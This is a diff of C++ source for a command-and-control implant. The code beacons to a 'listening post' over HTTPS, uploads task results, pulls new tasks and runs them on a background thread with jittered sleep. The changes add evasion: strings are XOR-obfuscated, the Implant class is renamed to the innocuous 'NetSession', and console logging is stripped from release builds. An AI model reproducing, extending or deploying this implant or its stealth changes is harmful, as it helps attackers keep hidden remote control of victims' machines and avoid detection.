@@ -13,13 +13,22 @@
 #include <boost/property_tree/ptree.hpp>
 
 #include <cpr/cpr.h>
+#include <xor_string.hpp>
 
 #include <nlohmann/json.hpp>
+
+
+#ifdef DEBUG_BUILD
+#define DEBUG_LOG(x) std::cout << x << std::endl
+#else
+#define DEBUG_LOG(x) ((void)0)
+#endif
+
 
 using json = nlohmann::json;
 
 
-//Function to send async HTTP POST with payload to listening post
+//Function to send async HTTP(S) POST with payload to listening post
 [[nodiscard]] std::string sendHttpRequest(std::string_view host, 
     std::string_view port, 
     std::string_view uri, 
@@ -33,7 +42,7 @@ using json = nlohmann::json;
 
     //construct listening post endpoint URL, only HTTp
     std::stringstream ss;
-    ss << "https://" << serverAddress << ":" << serverPort << serverUri;
+    ss << XOR_STR("https://") << serverAddress << ":" << serverPort << serverUri;
     std::string fullServerUrl = ss.str();
 
 
@@ -41,7 +50,7 @@ using json = nlohmann::json;
     cpr::AsyncResponse asyncRequest = cpr::PostAsync(
         cpr::Url{ fullServerUrl },
         cpr::Body{ requestBody.dump() },
-        cpr::Header{ {"Content-Type", "application/json"} },
+        cpr::Header{ {XOR_STR("Content-Type"), XOR_STR("application/json")} },
         cpr::ssl::VerifyHost{ true },       // verify server hostname
         cpr::ssl::VerifyPeer{ true },       // verify server certificate
         cpr::CertInfo{ "cert.pem" }  // path to CA cert bundle
@@ -59,7 +68,7 @@ using json = nlohmann::json;
     cpr::Response response = asyncRequest.get();
 
     //show request contents
-    std::cout << "Request body: " << requestBody << std::endl;
+    DEBUG_LOG(XOR_STR("Request body: ") << requestBody);
 
     //return body of the response from listening post, may include new tasks
     return response.text;
@@ -67,15 +76,15 @@ using json = nlohmann::json;
 };
 
 //enable/disable the running status
-void Implant::setRunning(bool isRunningIn) { isRunning = isRunningIn; }
+void NetSession::setRunning(bool isRunningIn) { isRunning = isRunningIn; }
 
 //set mean dwell time
-void Implant::setMeanDwell(double meanDwell) {
+void NetSession::setMeanDwell(double meanDwell) {
     dwellDistributionSeconds = std::exponential_distribution<double>(1. / meanDwell);
 }
 
 //send task results and receive new tasks
-[[nodiscard]] std::string Implant::sendResults() {
+[[nodiscard]] std::string NetSession::sendResults() {
     boost::property_tree::ptree resultsLocal;
     //scoped lock to perform swap
     {
@@ -89,7 +98,7 @@ void Implant::setMeanDwell(double meanDwell) {
     return sendHttpRequest(host, port, uri, resultsStringStream.str());
 }
 
-void Implant::parseTasks(const std::string& response) {
+void NetSession::parseTasks(const std::string& response) {
     std::stringstream responseStringStream{ response };
 
     //read response from listening post as JSON
@@ -111,7 +120,7 @@ void Implant::parseTasks(const std::string& response) {
 
 
 //loop and go thru takss from listening post, service them
-void Implant::serviceTasks() {
+void NetSession::serviceTasks() {
     while (isRunning) {
         std::vector<Task> localTasks;
         {
@@ -136,21 +145,21 @@ void Implant::serviceTasks() {
 }
 
 //beaconing to listening post
-void Implant::beacon() {
+void NetSession::beacon() {
     while (isRunning) {
 
         //Try to contact listening post to send results/get tasks
         //If tasks received, parse and store for async execution by task thread
 
         try {
-            std::cout << "Implant sending results to listening post...\n" << std::endl;
+            DEBUG_LOG("Implant sending results to listening post...");
             const auto serverResponse = sendResults();
-            std::cout << "\nListening post response content: " << serverResponse << std::endl;
-            std::cout << "\nParsing tasks received..." << std::endl;
+            DEBUG_LOG("Listening post response content: " << serverResponse);
+            DEBUG_LOG("Parsing tasks received...");
             parseTasks(serverResponse);
         }
         catch (const std::exception& e) {
-            printf("\nBeaconing error: %s\n", e.what());
+            DEBUG_LOG("Error occurred while beaconing: " << e.what());
         }
 
         //sleep for set duration w/ jitter and beacon again later
@@ -162,7 +171,7 @@ void Implant::beacon() {
 }
 
 //Initialize variables for object
-Implant::Implant(std::string host, std::string port, std::string uri) :
+NetSession::NetSession(std::string host, std::string port, std::string uri) :
     host{ std::move(host) },
     port{ std::move(port) },
     uri{ std::move(uri) },
@@ -174,7 +183,7 @@ Implant::Implant(std::string host, std::string port, std::string uri) :
 {
 }
 
-void Implant::start() {
+void NetSession::start() {
     taskThread = std::async(std::launch::async, [this] {
         serviceTasks();
     });
